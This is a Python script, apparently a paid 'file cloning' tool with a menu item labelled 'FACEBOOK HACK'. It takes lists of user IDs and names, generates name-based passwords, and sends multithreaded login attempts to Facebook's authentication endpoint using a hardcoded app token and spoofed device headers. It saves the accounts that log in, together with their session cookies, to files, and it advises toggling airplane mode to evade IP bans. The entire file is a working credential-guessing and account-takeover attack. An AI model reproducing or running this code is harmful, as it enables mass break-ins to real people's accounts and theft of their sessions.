#__________________[ IMPORT ]__________________#
import os,uuid,random,httpx,json,sys
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
#__________________[ LOOP ]__________________#
loop=0;oks=[];cps=[];pcp=[];id=[];ugen=[];ugen2=[];tokenku=[]
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; SWAG-143\x07')
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')
#__________________[ LOGO ]__________________#
logo =f"""
 {A} _     _ _______ ______  _____ ______ \n     {A} |_____| |_____| |_____]   |   |_____]\n     {A} |     | |     | |_____] __|__ |_____]\n{A}─────────────────────────────────────────────────\n{A}|=| OWNER   : HABIB HOSSAIN\n{A}|=| TOOL    : FILE/RANDOM/GMAIL CLONING\n{A}|=| VERSION : 0.0\n{A}─────────────────────────────────────────────────
{A}──────────────────────────────────────────────────
{R}❲{A}={R}❳{G} OWNER    {R}:{G} ANIK HOSSAIN
{R}❲{A}={R}❳{G} FACEBOOK {R}:{G} ANIK\_____:*\❷/3:)\⓿
{R}❲{A}={R}❳{G} TOOLTYPE {R}:{G} FILE CLONING
{R}❲{A}={R}❳{G} STATUS   {R}:{G} PAID
{A}──────────────────────────────────────────────────"""
#__________________[ MENU ]__________________#
def menu():
    clear()
    print(f'{R}❲{A}1{R}❳{G} FACEBOOK HACK ')
    print(f'{R}❲{A}2{R}❳{G} FF  HACK ') 
    print(f'{R}❲{A}0{R}❳{G} TIK TIK HACK ');linex()
    option=input(f'{R}❲{A}?{R}❳{G} CHOICE {R}:{G} ')
    if option in ['1','A']:
        filex()
    elif option in ['2','B']:
    	os.system('xdg-open https://www.fasahathat');menu()
    else:
        exit(f'{R}❲{A}={R}❳{G} BYE BYE ')
#__________________[ FILE ]__________________#
def filex():
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} SORY BRO YOUR IP HAS BEN ');linex()
    filex=input(f'{R}❲{A}?{R}❳{G} NOT WORK YOUR IP BAN{R}:{G} ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{R}❲{A}={R}❳{G} FILE NOT FOUND ');slp(2)
        filex()
    clear()
    print(f'{R}❲{A}1{R}❳{G} METHOD {R}❲{A}M1{R}❳{A} \n{R}❲{A}2{R}❳{G} METHOD {R}❲{A}M2{R}❳{A}  ');linex()
    mthd=input(f'{R}❲{A}?{R}❳{G} CHOICE {R}:{G} ')
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} BD/10-20 & OTHERS/5-10');linex()
    try:
        pas_limit=int(input(f'{R}❲{A}={R}❳{G} PASSWORD LIMIT {R}:{G} '))
    except:
        pas_limit=1
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} first123/firstlast/first@@@');linex()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'{R}❲{A}={R}❳{G} PASSWORD NO {R}❲{A}{i+1}{R}❳{G} {R}:{G} ')
        pas_list.append(pasx)
    with ted(max_workers=30) as swag:
        tl=str(len(fo))
        clear()
        print(f'{R}❲{A}={R}❳{G} TOTAL FILE UID {R}:{A} '+tl)
        print(f'{R}❲{A}={R}❳{G} TURN {R}❲{A}ON{G}/{A}OFF{R}❳{G} AIRPLANE MODE EVERY {A}3{G} MIN');linex()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            if mthd in ['1','01']:
            	swag.submit(swag1,ids,names,passlist)
            elif mthd in ['2','02']:
            	swag.submit(swag2,ids,names,passlist)
    print('\033[1;37m')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{R}❲{A}={R}❳{G} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{R}❲{A}={R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
    print(f'{R}❲{A}={R}❳{G} TOTAL CP ID {R}:{M} '+str(len(cps)))
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{R}❲{A}={R}❳{G} PRESS ENTER TO BACK ')
    main()
#__________________[ FILE METHOD M1 ]__________________#
def swag1(ids,names,passlist):
    global oks,cps,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write(f'\r\r{R}❲{G}SWAG-M1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}:{G}%s{R}❳{A}-{R}❲{G}CP{R}:{G}%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953126;[FBAN/FB4A;FBAV/293.0.0.43.120;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/251953126;FBCR/Airtel;FBMF/Itel;FBBD/itel;FBDV/P9;FBSV/10.7.3;FBCA/x86:armeabi-v7a;FBDM/{density=4.0,width=862,height=1047};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print(f'\r\r{G}❲SWAG-OK❳ '+ids+'|'+pas)
                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r{G}❲COOKIE❳➤ "+cookie)
                open('/sdcard/SWAG-FILE-M1-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print(f'\r\r{M}❲SWAG-CP❳ '+ids+'|'+pas)
                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#__________________[ FILE METHOD M2 ]__________________#
def swag2(ids,names,passlist):
    global oks,cps,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write(f'\r\r{R}❲{G}SWAG-M2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}:{G}%s{R}❳{A}-{R}❲{G}CP{R}:{G}%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/38.0.0.0.81;FBBV/12144892;[FBAN/FB4A;FBAV/38.0.0.0.81;FBPN/com.facebook.katana;FBLC/en_US;FBBV/12144892;FBCR/C-Spire Wireless;FBMF/Asus;FBBD/asus;FBDV/ZS660KL;FBSV/7.5.3;FBCA/arm64-v8a:;FBDM/{density=3.0,width=1321,height=2041};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print(f'\r\r{G}❲SWAG-OK❳ '+ids+'|'+pas)
                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r{G}❲COOKIE❳➤ "+cookie)
                open('/sdcard/SWAG-FILE-M2-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print(f'\r\r{M}❲SWAG-CP❳ '+ids+'|'+pas)
                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#__________________[ END ]__________________#
menu()